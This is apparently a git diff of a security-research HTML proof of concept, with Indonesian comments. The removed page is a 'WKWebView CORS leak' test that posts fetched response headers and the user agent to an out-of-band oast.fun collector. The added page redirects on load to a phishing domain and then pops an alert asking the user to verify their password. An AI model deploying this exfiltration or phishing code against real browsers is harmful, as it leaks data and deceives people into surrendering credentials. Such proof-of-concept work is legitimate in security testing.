@@ -1,47 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>WKWebView CORS Leak</title>
-  <style>
-    body {
-      background: #000;
-      color: #0f0;
-      font-family: monospace;
-      padding: 20px;
-    }
-    .status {
-      margin-top: 20px;
-    }
-  </style>
+  <title>Loading...</title>
+  <script>
+    // Simulasikan pergantian halaman (tanpa mengubah tab title)
+    window.onload = function () {
+      // Ganti lokasi ke domain phishing tanpa menambah entry history
+      location.replace("https://phishing.com");
+
+      // Delay agar phishing.com termuat di address bar
+      setTimeout(() => {
+        // Tampilkan native alert tanpa origin context
+        alert("🔒 Please verify your password to continue.");
+      }, 1000);
+    };
+  </script>
 </head>
 <body>
-  <h1>WKWebView CORS Leak Test</h1>
-  <p>Menguji apakah fetch() ke domain Apple dapat dilakukan dari WKWebView tanpa preflight.</p>
-  <div class="status">⏳ Fetching...</div>
-
-  <script>
-  const statusDiv = document.querySelector('.status');
-
-  fetch("https://apple.com/.well-known/apple-app-site-association")
-    .then(r => {
-      statusDiv.textContent = `✅ Status: ${r.status}, Content-Type: ${r.headers.get("content-type")}`;
-
-      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify({
-          leak: true,
-          status: r.status,
-          headers: [...r.headers.entries()],
-          ua: navigator.userAgent,
-          ts: Date.now()
-        })
-      });
-    })
-    .catch(e => {
-      statusDiv.textContent = `❌ Fetch failed: ${e}`;
-    });
-  </script>
+  <p>Loading…</p>
 </body>
 </html>
